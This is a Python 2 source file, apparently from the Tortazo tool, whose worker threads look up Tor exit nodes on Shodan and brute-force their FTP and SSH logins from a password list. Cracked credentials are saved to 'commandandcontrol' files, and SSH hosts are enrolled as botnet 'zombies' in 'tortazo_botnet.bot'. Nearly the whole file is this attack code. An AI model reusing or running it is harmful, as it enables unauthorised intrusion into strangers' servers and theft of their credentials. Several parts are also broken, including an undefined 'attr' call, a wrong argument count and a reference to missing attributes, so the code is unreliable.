# coding=utf-8
'''
Created on 22/01/2013
@author: Adastra
WorkerThread.py

WorkerThread is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

WorkerThread is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

import threading
from stem.util import term
from shodan.api import WebAPIError
from shodan import WebAPI
import Queue
import paramiko
import os
import ftplib

class WorkerThread(threading.Thread):
    '''
	Worker Thread to information gathering and attack the exit nodes found.
	'''
    def __init__(self, queue, tid, cli) :
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
        self.cli = cli
        #This maps to the function name and port number.
        self.bruteForcePorts ={'ftpBrute':21, 'sshBrute':22}

        if self.cli.useShodan == True:
            #Using Shodan to search information about this machine in shodan database.
            self.cli.logger.info(term.format("[+] Shodan Activated. About to read the Development Key. ", term.Color.YELLOW))
            if self.cli.shodanKey == None:
                #If the key is None, we can't use shodan.
                self.cli.logger.warn(term.format("[-] Shodan Key's File has not been specified. We can't use shodan without a valid key", term.Color.RED))
            else:
                #Read the shodan key and create the WebAPI object.
                shodanKey = open(self.cli.shodanKey).readline().rstrip('\n')
                self.shodanApi = WebAPI(shodanKey)
                self.cli.logger.debug(term.format("[+] Connected to Shodan using Thread: %s " %(self.tid), term.Color.GREEN))
    def run(self) :
        lock = threading.Lock()
        while True :
            lock.acquire()
            host = None
            try:
                self.ip, (self.port, self.descriptor) = self.queue.get()
                if hasattr(self, 'shodanApi'):
                    self.cli.logger.debug(term.format("[+] Using Shodan against %s " %(self.ip), term.Color.GREEN))
                    try:
                        shodanResults = self.shodanApi.host(self.ip)
                        self.recordShodanResults(self, self.ip, shodanResults)
                    except WebAPIError:
                        self.cli.logger.error(term.format("[-] There's no information about %s in the Shodan Database." %(self.ip), term.Color.RED))
                        pass
                if self.cli.brute is True:
                    if self.cli.dictFile is not None:
                        for method in self.bruteForcePorts.keys():
                            if self.bruteForcePorts[method] == self.port:
                                #Open port detected for a service supported in the "Brute-Forcer"
                                #Calling the method using reflection.
                                attr(method)
                    else:
                        self.cli.logger.warn(term.format("[-] BruteForce mode specified but there's no files for users and passwords. Use -f option", term.Color.RED))
            except Queue.Empty :
                self.cli.logger.debug(term.format("[+] Worker %d exiting... "%self.tid, term.Color.GREEN))
            finally:
                self.cli.logger.debug(term.format("[+] Releasing the Lock in the Thread %d "%self.tid, term.Color.GREEN))
                lock.release()
                self.queue.task_done()


    def ftpBrute(self):
        self.cli.logger.debug(term.format("[+] Starting FTP BruteForce mode on Thread: %d "%self.tid, term.Color.GREEN))
        self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.passFile), term.Color.GREEN))
        ftpFileName = 'commandandcontrolftp.txt'
        if(os.path.exists(self.cli.passFile)):
            for line in open(self.cli.passFile, "r").readlines() :
                [user, passwd] = line.strip().split()
                try :
                    ftpClient = ftplib.FTP(self.ip)
                    ftpClient.login(user, passwd)
                except:
                    continue
                if ftpClient:
                    self.cli.logger.info(term.format("[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd), term.Color.YELLOW))
                    ftpClient.quit()
                    ftpFile = open(ftpFileName, 'a')
                    entry =  '%s:%s:%s' %(self.ip, user, passwd)
                    ftpFile.write(entry)
                    ftpFile.close()
        else:
            self.cli.logger.warn(term.format("[-] passwords file not found on the path %s" %(self.cli.passFile), term.Color.RED))

    def sshBrute(self):
        self.cli.logger.debug(term.format("[+] Starting SSH BruteForce mode on Thread: %d " %self.tid, term.Color.GREEN))
        self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.passFile), term.Color.GREEN))
        sshClient = paramiko.SSHClient()
        sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        tortazoFile = 'tortazo_botnet.bot'
        if(os.path.exists(self.cli.passFile)):
            for line in open(self.cli.passFile, "r").readlines() :
                [user, passwd] = line.strip().split()
                try :
                    sshClient.connect(self.ip, username=user, password=passwd)
                except paramiko.AuthenticationException:
                    continue
                self.cli.logger.info(term.format("[+] SSH Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd), term.Color.YELLOW))
                sshClient.close()
                sshFile = open(sshFileName, 'a')
                entry =  '%s:%s:%s' %(self.ip, user, passwd)
                sshFile.write(entry)
                sshFile.close()
                self.cli.logger.debug(term.format("[+] Updating the file 'tortazo_botnet.bot' with the new Zombie", term.Color.GREEN))
                
                tortazoFd = open(tortazoFile, 'a')
                #host:user:pass:port:nickname				
                entryBotnet = '%s:%s:%s:%s:%s' %(self.ip, user, passwd, '22', self.descriptor.nickname)
                content = open(tortazoFile, 'r').readlines()
                if entryBotnet in content:
                    self.cli.logger.debug(term.format("[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file", term.Color.GREEN))
                else:
                    tortazoFd.write(entryBotnet)
                    self.cli.logger.debug(term.format("[+] Entry %s added" %(entry), term.Color.GREEN))
                tortazoFd.close()
                break
        else:
            self.cli.logger.warn(term.format("[-] passwords file not found on the path %s" %(self.cli.passFile), term.Color.RED))

    def recordShodanResults(self, host, results):
        entryFile = 'shodanScan-%s.txt' %(host)
        shodanFileResults = open(entryFile, 'a')
        entry = '------- SHODAN REPORT START FOR %s ------- \n' %(host)
        self.recursiveInfo(entry, results)
        entry += '------- SHODAN REPORT END FOR %s ------- \n' %(host)
        shodanFileResults.write(entry)
        shodanFileResults.close()
        self.cli.logger.debug("[+] Shodan File Created.")

    def recursiveInfo(self, entry, data):
        if type(data) == dict:
            for key in self.results.keys():
                if type(key) == dict:
                    entry += self.recursiveInfo(entry, key)
                elif type(key) == list:
                    for element in key:
                        if type(key) == dict:
                            entry += self.recursiveInfo(entry, key)
                else:
                    entry += '[+]%s : %s \n' %(key, self.results[key])
                    print entry
